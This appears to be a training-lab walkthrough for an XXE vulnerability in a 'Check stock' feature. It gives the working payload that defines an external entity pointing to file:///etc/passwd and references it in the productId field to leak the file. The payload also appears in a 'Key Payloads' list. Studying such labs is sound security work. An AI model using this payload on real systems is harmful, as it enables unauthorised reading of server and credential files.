## Exploiting XXE using external entities to retrieve files

**Category:** xxe
**Difficulty:** Unknown

### Description
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

### Solution Steps
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
3. Replace the productId number with a reference to the external entity: &xxe; . The response should contain "Invalid product ID:" followed by the contents of the /etc/passwd file.

### Key Payloads
- `/etc/passwd`
- `stockCheck`
- `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
- `productId`
- `&xxe;`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xxe
